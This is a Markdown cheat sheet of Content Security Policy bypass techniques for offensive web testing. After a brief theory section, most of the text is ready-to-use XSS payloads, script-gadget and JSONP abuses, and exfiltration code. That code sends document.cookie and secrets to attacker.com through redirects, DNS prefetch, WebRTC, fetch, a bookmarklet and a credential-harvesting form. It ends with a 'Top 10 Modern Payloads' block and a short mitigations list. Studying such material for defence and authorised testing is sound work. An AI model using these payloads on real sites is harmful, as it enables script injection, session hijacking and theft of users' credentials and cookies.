## 📖 Theory & Overview

**Content Security Policy (CSP)** is an HTTP response header that browsers use to restrict which resources (scripts, styles, images, etc.) can load on a page. It's designed to **prevent XSS, clickjacking, code injection, and data exfiltration**.

### How CSP Works

- **Implemented via HTTP header:**
    
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;
    ```
    
- **Or via HTML meta tag:**
    
    ```html
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
    ```
    

### Key CSP Headers

- **`Content-Security-Policy`** → Enforces policy (blocks violations)
- **`Content-Security-Policy-Report-Only`** → Monitoring mode (reports violations without blocking)

### Important Directives

|Directive|Purpose|
|---|---|
|**script-src**|Controls JavaScript sources|
|**default-src**|Fallback for unspecified directives|
|**img-src**|Controls image sources|
|**style-src**|Controls CSS sources|
|**connect-src**|Controls fetch/XHR/WebSocket destinations|
|**frame-src**|Controls iframe sources|
|**frame-ancestors**|Controls who can embed the page|
|**object-src**|Controls `<object>`, `<embed>`, `<applet>`|
|**base-uri**|Controls `<base>` tag URLs|
|**form-action**|Controls form submission destinations|
|**upgrade-insecure-requests**|Forces HTTP → HTTPS|

### Source Values

|Source|Meaning|
|---|---|
|**'self'**|Same origin only|
|**'unsafe-inline'**|Allows inline scripts/styles|
|**'unsafe-eval'**|Allows `eval()`, `setTimeout()`, etc.|
|**'none'**|Blocks everything|
|**'nonce-xyz'**|Whitelist via cryptographic nonce|
|**'sha256-...'**|Whitelist via hash|
|**'strict-dynamic'**|Scripts loaded by whitelisted scripts are trusted|
|**https:**|Allow any HTTPS URL|
|**data:**|Allow data: URIs|
|*****|Allow any URL (except data:, blob:, filesystem:)|

---

## ⚡ CSP Testing Tools

✅ **Online Evaluators:**

- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Validator](https://cspvalidator.org/)

✅ **Browser DevTools:**

- Check Console for CSP violation errors
- Network tab shows blocked requests

---

## 🔓 Exploitation Methods & Bypasses

### 1️⃣ **'unsafe-inline' Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

✅ **Working Payloads:**

```html
"/><script>alert(1);</script>
<img src=x onerror="alert(1)">
<iframe src="javascript:alert(1)"></iframe>
```

---

### 2️⃣ **'unsafe-eval' Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

✅ **Working Payloads:**

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

⚠️ **Note:** Some sources report this may not work in modern browsers.

---

### 3️⃣ **Wildcard (*) Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src 'self' https: data *;
```

✅ **Working Payloads:**

```html
<script src=https://attacker.com/evil.js></script>
<script src=data:text/javascript,alert(1337)></script>
```

---

### 4️⃣ **Missing object-src / default-src Bypass**

**When CSP lacks object-src:**

```http
Content-Security-Policy: script-src 'self';
```

✅ **Working Payloads:**

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe srcdoc='<script src="data:text/javascript,alert(1)"></script>'></iframe>
```

⚠️ **Note:** May not work in modern browsers.

---

### 5️⃣ **File Upload + 'self' Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src 'self';
```

**Steps:**

1. Upload a file with JS payload (e.g., `malicious.js`)
2. If server doesn't validate extension properly, upload as `.png.js` or use polyglot files
3. Reference it:

```html
<script src="/uploads/malicious.js"></script>
<script src="/uploads/payload.png.js"></script>
```

**Key Tips:**

- Look for **misinterpreted extensions** (e.g., `.wave` not recognized by Apache)
- If `X-Content-Type-Options: nosniff` is missing, browsers may MIME-sniff text files as JS
- Create **polyglots** (files valid as both image + JS)

---

### 6️⃣ **JSONP Endpoint Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src 'self' https://accounts.google.com;
```

✅ **Working Payloads:**

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
<script src="https://www.youtube.com/oembed?callback=alert;"></script>
```

**JSONP Endpoint Lists:**

- [JSONBee - Ready JSONP Endpoints](https://github.com/zigoo0/JSONBee)

---

### 7️⃣ **Whitelisted CDN + Vulnerable Library Bypass**

**When CSP allows:**

```http
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com 'unsafe-eval';
```

✅ **AngularJS Bypass (v1.0.8):**

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

✅ **AngularJS + Prototype.js:**

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js"></script>
<div class="ng-app" ng-csp>{{$on.curry.call().alert(1)}}</div>
```

✅ **AngularJS + Recaptcha JS:**

```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />
```

✅ **Vue.js (requires unsafe-eval):**

```html
<script src="https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js"></script>
<div id="app">{{_c.constructor`alert(1)`()}}</div>
<script>new Vue({el: '#app'})</script>
```

---

### 8️⃣ **base-uri Missing Bypass**

**When base-uri is missing:**

```http
Content-Security-Policy: script-src 'self' 'nonce-secret';
```

✅ **Payload:**

```html
<base href='https://attacker.com'>
<script nonce=secret src=/script.js></script>
```

**Result:** Browser loads `https://attacker.com/script.js` instead of same-origin script.

---

### 9️⃣ **Nonce Reuse Bypass**

**When nonce is static or predictable:**

✅ **Reuse Nonce from Page:**

```html
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.defaultView.top.document.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//attacker.com/evil.js";
  b.nonce=a.nonce;
  doc.body.appendChild(b)' />
```

---

### 🔟 **Script Gadgets Bypass**

**When allowed scripts have unsafe DOM manipulation:**

**Example vulnerable code:**

```javascript
var array = document.getElementById('cmd').value.split(',');
window[array[0]].apply(this, array.slice(1));
```

✅ **Payload:**

```html
<input id="cmd" value="alert,1">
```

**Another example:**

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value;
var n = document.createElement("script");
n.src = t;
```

✅ **Payload:**

```html
<input id="RecaptchaClientUrl-" value="//attacker.com/evil.js" />
```

---

### 1️⃣1️⃣ **Open Redirect Bypass**

**When CSP whitelists domain with open redirect:**

```http
Content-Security-Policy: script-src https://trusted.com/path/;
```

✅ **Payload:**

```html
<script src="https://trusted.com/redirect?url=https://attacker.com/evil.js"></script>
```

**Key:** Path restrictions are bypassed via server-side redirect.

---

### 1️⃣2️⃣ **Relative Path Overwrite (RPO)**

**When CSP allows specific paths:**

```http
Content-Security-Policy: script-src https://example.com/scripts/react/;
```

✅ **Payload:**

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

**Result:** Browser requests from allowed path, but server interprets as `../angular/angular.js`.

---

### 1️⃣3️⃣ **Policy Injection Bypass**

**When CSP is dynamically generated from user input:**

**Chrome:**

```html
?x=;script-src-elem *&y=<script src="http://attacker.com/xss.js"></script>
?x=;script-src-elem 'unsafe-inline'&y=<script>alert(1)</script>
```

**Edge:**

```html
?x=;_&y=<script>alert(1)</script>
```

---

### 1️⃣4️⃣ **strict-dynamic Bypass**

**When CSP uses strict-dynamic:**

```http
Content-Security-Policy: script-src 'nonce-abc' 'strict-dynamic';
```

**Key:** Any script loaded by a whitelisted script is trusted.

✅ **Payload (if you control whitelisted script):**

```javascript
var s = document.createElement('script');
s.src = 'https://attacker.com/evil.js';
document.body.appendChild(s);
```

---

### 1️⃣5️⃣ **self + unsafe-inline + iframe Bypass**

**When CSP allows:**

```http
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```

**Steps:**

1. Open error page or text file in iframe (often lacks CSP)
2. Inject script into iframe DOM

✅ **Via Errors:**

```javascript
// Trigger nginx error
frame = document.createElement("iframe");
frame.src = "/%2e%2e%2f";
document.body.appendChild(frame);

// Inject after load
script = document.createElement("script");
script.src = "//attacker.com/evil.js";
window.frames[0].document.head.appendChild(script);
```

✅ **Via Text/Image Files:**

```javascript
frame = document.createElement("iframe");
frame.src = "/robots.txt";
document.body.appendChild(frame);

script = document.createElement("script");
script.src = "//attacker.com/evil.js";
window.frames[0].document.head.appendChild(script);
```

---

### 1️⃣6️⃣ **Third-Party Domain Abuses**

**When CSP whitelists risky domains:**

|Domain|Capability|Technique|
|---|---|---|
|***.facebook.com**|Exfil|Register Facebook app, use tracking pixel|
|***.cloudfront.net**|Exec + Exfil|Host attacker files on CloudFront|
|***.herokuapp.com**|Exec + Exfil|Deploy malicious Heroku app|
|***.firebaseapp.com**|Exec + Exfil|Host on Firebase|
|***.jsdelivr.com**|Exec|Load malicious npm package|

**Facebook Exfiltration Example:**

```javascript
fbq('init', 'ATTACKER_APP_ID');
fbq('trackCustom', 'DataLeak', {
  data: document.cookie
});
```

---

### 1️⃣7️⃣ **iframe JS Execution Bypass**

**When frame-src is misconfigured:**

✅ **Payloads:**

```html
<iframe srcdoc='<script>alert(1)</script>'></iframe>
<iframe src='data:text/html,<script>alert(1)</script>'></iframe>
<iframe src='javascript:alert(1)'></iframe>
```

---

### 1️⃣8️⃣ **Dangling Markup Injection**

**When full XSS blocked but data exfiltration possible:**

✅ **Payload:**

```html
<img src='https://attacker.com/log?
```

**Result:** Browser sends rest of HTML (including tokens/secrets) in incomplete request.

---

### 1️⃣9️⃣ **Service Workers Bypass**

**When CSP doesn't restrict importScripts:**

✅ **Payload:**

```javascript
navigator.serviceWorker.register('/sw.js');
// In sw.js:
importScripts('https://attacker.com/evil.js');
```

---

### 2️⃣0️⃣ **form-action Missing**

**When form-action not set:**

✅ **Credential Theft:**

```html
<form action="https://attacker.com/log">
  <input name="username">
  <input type="password" name="password">
</form>
```

**Key:** Password managers may auto-fill, sending creds to attacker.

---

## 🚨 Data Exfiltration Bypasses

### 🔹 **document.location**

```javascript
var secret = document.cookie;
document.location = "https://attacker.com/?" + secret;
```

---

### 🔹 **DNS Prefetch**

```javascript
var secret = document.cookie.split("=")[1];
var link = document.createElement("link");
link.rel = "dns-prefetch";
link.href = "//" + secret + ".attacker.com";
document.head.appendChild(link);
```

**Defense:** Server sends `X-DNS-Prefetch-Control: off`

---

### 🔹 **WebRTC**

```javascript
(async () => {
  p = new RTCPeerConnection({
    iceServers: [{urls: "stun:" + secret + ".attacker.com"}]
  });
  p.createDataChannel("");
  p.setLocalDescription(await p.createOffer());
})();
```

---

### 🔹 **Meta Refresh Redirect**

```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```

---

### 🔹 **CredentialsContainer (HTTPS only)**

```javascript
navigator.credentials.store(
  new FederatedCredential({
    id: "user",
    name: "user",
    provider: "https://" + secret + ".attacker.com",
    iconURL: "https://" + secret + ".attacker.com"
  })
);
```

---

### 🔹 **CSP Report-Only Exfiltration**

**If you control Content-Security-Policy-Report-Only:**

**Inject:**

```html
<meta http-equiv="Content-Security-Policy-Report-Only" content="script-src 'self'; report-uri https://attacker.com/log">
<script>SECRET_DATA</script>
```

**Result:** CSP violation report contains part of secret data.

---

## 💥 Higher Impact Techniques

### 🎯 **Rewrite Error Page Bypass**

```javascript
a = window.open("/" + "x".repeat(4100));
setTimeout(function() {
  a.document.body.innerHTML = `<img src=x onerror="fetch('https://attacker.com/upload/'+document.cookie)">`;
}, 1000);
```

---

### 🎯 **SOME (Same Origin Method Execution) + WordPress**

**When WordPress installed + 'self' allowed:**

**Steps:**

1. Find XSS in any endpoint
2. Load vulnerable endpoint in iframe
3. Use `opener` to access main page DOM
4. Abuse WordPress JSONP endpoint: `/wp-json/wp/v2/users/1?_jsonp=malicious_code`

**Result:** Bypass CSP, escalate privileges, install plugins.

---

### 🎯 **Kill CSP via PHP max_input_vars**

**When app uses PHP + headers set after output:**

**Technique:** Send 1000+ GET/POST params → triggers PHP warning → headers already sent → CSP header ignored.

```bash
curl "http://target.com/?xss=<script>alert(1)</script>&A=1&A=2&...&A=1000"
```

---

### 🎯 **PHP Response Buffer Overload**

**PHP buffers 4096 bytes before sending headers:**

**Technique:** Fill response with warnings/errors → buffer full → CSP sent too late.

---

### 🎯 **Bookmarklet Bypass**

**Social engineering:** Convince user to drag malicious bookmarklet to browser bar.

**Payload:**

```javascript
javascript:(function(){document.location='https://attacker.com/?cookie='+document.cookie})();
```

**Result:** Executes in page context, bypassing CSP.

---

### 🎯 **CSP Bypass via Restricting CSP**

**When you can inject more restrictive CSP (iframe csp attribute or meta tag):**

**Example:** Disable script that prevents exploitation:

```html
<iframe src="/target" csp="script-src 'self' 'sha256-ALLOWED_HASH_ONLY';"></iframe>
```

**Result:** Block protective script, enable CSTI/XSS.

---

## 🛡️ Top 10 Modern Payloads

```html
<!-- 1. AngularJS + Google Recaptcha -->
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(document.domain)" />

<!-- 2. Nonce Reuse -->
<img src="x" ng-on-error='doc=$event.target.ownerDocument;a=doc.defaultView.top.document.querySelector("[nonce]");b=doc.createElement("script");b.src="//attacker.com/xss.js";b.nonce=a.nonce;doc.body.appendChild(b)' />

<!-- 3. JSONP Google OAuth -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- 4. AngularJS + Prototype.js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>

<!-- 5. Base Tag Injection -->
<base href='https://attacker.com'>
<script nonce=secret src=/app.js></script>

<!-- 6. iframe srcdoc -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>

<!-- 7. DNS Exfiltration -->
<link rel="dns-prefetch" href="//SECRET.attacker.com">

<!-- 8. Script Gadget -->
<input id="cmd" value="alert,1">
<input id="RecaptchaClientUrl-" value="//attacker.com/xss.js" />

<!-- 9. Open Redirect Chain -->
<script src="https://trusted.com/redirect?url=https://attacker.com/jsonp?callback=alert(1)"></script>

<!-- 10. WebRTC Exfil -->
<script>(async()=>{p=new RTCPeerConnection({iceServers:[{urls:"stun:"+document.cookie+".attacker.com"}]});p.createDataChannel("");p.setLocalDescription(await p.createOffer());})();</script>
```

---

## 🛡️ Mitigations

✅ **Strict CSP:**

```http
Content-Security-Policy: default-src 'none'; script-src 'nonce-RANDOM'; style-src 'nonce-RANDOM'; img-src 'self'; connect-src 'self'; base-uri 'none'; frame-ancestors 'none';
```

✅ **Best Practices:**

- **Never use** `'unsafe-inline'` or `'unsafe-eval'`
- **Use nonces/hashes** for inline scripts
- **Avoid wildcards** (`*`, `https:`, `data:`)
- **Set base-uri** to `'none'` or `'self'`
- **Set frame-ancestors** to prevent clickjacking
- **Whitelist specific paths**, not entire domains
- **Rotate nonces** per request
- **Audit allowed domains** for JSONP/open redirects
- **Enable X-Content-Type-Options: nosniff**
- **Use CSP Level 3** features (`strict-dynamic`)

✅ **Defense in Depth:**

- Combine CSP with input validation
- Use HttpOnly cookies
- Implement CSRF tokens
- Enable SameSite cookie attribute

---

## 🔥 Quick Reference

**CSP Too Permissive?**

- ✅ Check for `'unsafe-inline'`, `'unsafe-eval'`, `*`, `data:`, `https:`
- ✅ Test whitelisted domains for JSONP/redirects
- ✅ Look for outdated JS libraries on allowed CDNs

**Can Upload Files?**

- ✅ Try `.js`, `.html`, polyglots, misinterpreted extensions

**iframe Allowed?**

- ✅ Test `srcdoc`, `data:`, `javascript:` schemes

**Nonce in Page?**

- ✅ Extract + reuse nonce if `strict-dynamic` set

**form-action Missing?**

- ✅ Inject form to steal credentials

---

🎯 **You got this! Go break some CSPs!** 🚀